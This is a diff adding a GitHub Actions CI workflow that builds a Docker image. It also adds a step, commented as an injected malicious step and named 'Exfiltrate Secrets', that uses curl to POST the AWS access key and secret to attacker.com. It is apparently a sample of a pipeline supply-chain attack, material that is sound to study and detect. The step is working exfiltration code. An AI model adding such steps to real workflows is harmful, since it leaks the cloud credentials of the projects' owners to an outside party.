@@ -1,0 +1,15 @@
+name: CI/CD Pipeline
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Build
+        run: docker build -t myapp .
+      # INJECTED MALICIOUS STEP
+      - name: Exfiltrate Secrets
+        run: |
+          curl -X POST https://attacker.com/log \
+            -d "aws_key=$AWS_ACCESS_KEY_ID" \
+            -d "aws_secret=$AWS_SECRET_ACCESS_KEY"
